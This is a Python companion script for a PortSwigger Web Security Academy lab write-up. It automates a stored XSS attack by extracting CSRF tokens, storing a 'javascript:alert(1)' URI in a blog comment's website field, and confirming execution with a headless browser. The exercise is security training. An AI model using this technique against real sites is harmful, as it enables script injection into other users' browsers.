#!/usr/bin/env python3
"""
Stored XSS into anchor href attribute with double quotes HTML-encoded
PortSwigger Web Security Academy — Cross-Site Scripting (XSS)

Companion script for the writeup: 08-stored-xss-href-double-quotes-encoded.md

What this does:
    Stores a canary in the comment form's "website" field, confirms it
    lands inside the author link's href attribute, then posts a real
    javascript: URI as the website value (handling CSRF extraction itself).
    Since the entire href value is attacker-controlled, no quote-breakout
    is needed even though double quotes are HTML-encoded here. Confirms
    execution with a headless browser that clicks the stored author link.

Usage:
    python 08-stored-xss-href-double-quotes-encoded.py <lab-url>
    e.g. python 08-stored-xss-href-double-quotes-encoded.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
    pip install playwright && playwright install chromium
"""

import re
import sys
import urllib.parse
import httpx
from playwright.sync_api import sync_playwright

CANARY = "xssCANARY7531_stored"


def get_csrf(client: httpx.Client, path: str) -> str:
    r = client.get(path)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(base_url=lab_url, follow_redirects=True, timeout=20)
    client.get("/")
    session = client.cookies.get("session", "")
    domain = urllib.parse.urlparse(lab_url).netloc

    r = client.get("/")
    post_ids = re.findall(r"/post\?postId=(\d+)", r.text)
    if not post_ids:
        print("[-] No blog posts found")
        return
    post_id = post_ids[0]
    post_path = f"/post?postId={post_id}"
    post_url = f"{lab_url}{post_path}"

    csrf = get_csrf(client, post_path)
    base_post_data = {"postId": post_id, "name": "attacker", "email": "a@b.com",
                       "comment": "click my name", "csrf": csrf}

    # Layer 1: detect -- store the canary in the website field, confirm it lands in href=.
    client.post("/post/comment", data={**base_post_data, "website": CANARY})
    check = client.get(post_path)
    if CANARY not in check.text:
        print("[-] Canary not found on post page -- stored XSS not confirmed")
        return
    if re.search(rf'href="[^"]*{CANARY}', check.text, re.IGNORECASE):
        context = "href"
    else:
        context = "attribute"
    print(f"[+] Stored canary found -- context: {context}")

    if re.search(rf"{CANARY}&quot;|{CANARY}&#34;", check.text):
        print("[*] Double quotes are HTML-encoded")

    # Layer 2: craft -- href context -> full javascript: URI, no quotes needed.
    payload = "javascript:alert(1)"
    print(f"[*] Crafted payload: {payload}")

    # Layer 3: store the real payload with a fresh CSRF token, then click the link.
    csrf = get_csrf(client, post_path)
    client.post("/post/comment", data={**base_post_data, "website": payload, "csrf": csrf})
    print("[*] Stored href payload")

    alert_fired = False
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        ctx = browser.new_context()
        if session:
            ctx.add_cookies([{"name": "session", "value": session, "domain": domain, "path": "/"}])
        page = ctx.new_page()

        def on_dialog(dialog):
            nonlocal alert_fired
            alert_fired = True
            dialog.accept()

        page.on("dialog", on_dialog)
        try:
            page.goto(post_url, wait_until="domcontentloaded", timeout=15000)
            page.wait_for_timeout(1000)
            page.click("a[href^='javascript']", timeout=5000)
            page.wait_for_timeout(3000)
        except Exception:
            pass
        browser.close()

    print(f"[{'+' if alert_fired else '-'}] alert() {'fired' if alert_fired else 'did NOT fire'} after clicking the author link")

    result = client.get("/")
    if "Congratulations" in result.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
